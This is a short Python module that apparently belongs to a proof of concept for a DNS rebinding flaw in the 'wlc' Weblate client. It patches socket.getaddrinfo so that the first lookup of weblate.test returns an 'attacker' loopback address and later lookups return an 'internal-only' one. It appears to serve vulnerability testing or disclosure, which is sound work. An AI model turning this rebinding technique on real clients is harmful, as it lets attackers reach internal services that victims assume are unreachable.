"""Simulate an attacker-controlled authoritative DNS zone with TTL 0.

Loaded into the real `wlc` CLI process via PYTHONPATH. The first lookup of
weblate.test answers with the attacker's own front-end address; every later
lookup answers with an address the client could never reach on its own. No
wlc code is patched -- only name resolution, which is what the attacker
legitimately controls for their own domain.
"""

import os
import socket

if os.environ.get("WLC_POC_DNS") == "1":
    REBIND_NAME = "weblate.test"
    FIRST_ADDRESS = "127.0.0.1"  # attacker front-end
    REBOUND_ADDRESS = "127.0.0.2"  # "internal-only" service
    _state = {"lookups": 0}
    _real_getaddrinfo = socket.getaddrinfo

    def getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):  # noqa: A002
        if host == REBIND_NAME:
            _state["lookups"] += 1
            address = FIRST_ADDRESS if _state["lookups"] == 1 else REBOUND_ADDRESS
            print(
                f"[dns] lookup #{_state['lookups']} {host} -> {address}",
                flush=True,
            )
            return _real_getaddrinfo(address, port, family, type, proto, flags)
        return _real_getaddrinfo(host, port, family, type, proto, flags)

    socket.getaddrinfo = getaddrinfo
